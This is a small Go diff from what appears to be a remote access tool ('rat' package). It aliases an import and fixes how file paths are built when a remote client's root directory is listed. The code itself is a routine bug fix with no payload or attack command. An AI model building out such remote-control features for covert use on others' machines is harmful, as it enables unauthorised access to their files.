@@ -3,7 +3,7 @@ package main
 import (
 	"encoding/binary"
 	"io"
-	"rat/internal"
+	shared "rat/internal"
 	"rat/internal/network/header"
 )
 
@@ -38,7 +38,11 @@ func (ch ChannelQueryDirectory) Open(r io.ReadWriteCloser, c *Client) error {
 		binary.Read(r, binary.LittleEndian, &f.Dir)
 		basename, _ := shared.ReadString(r)
 
-		f.Path = ch.Path + c.GetPathSep() + basename
+		if ch.Path == "/" {
+			f.Path = "/" + basename
+		} else {
+			f.Path = ch.Path + c.GetPathSep() + basename
+		}
 
 		binary.Read(r, binary.LittleEndian, &f.Time)
 		if err := binary.Read(r, binary.LittleEndian, &f.Size); err != nil {
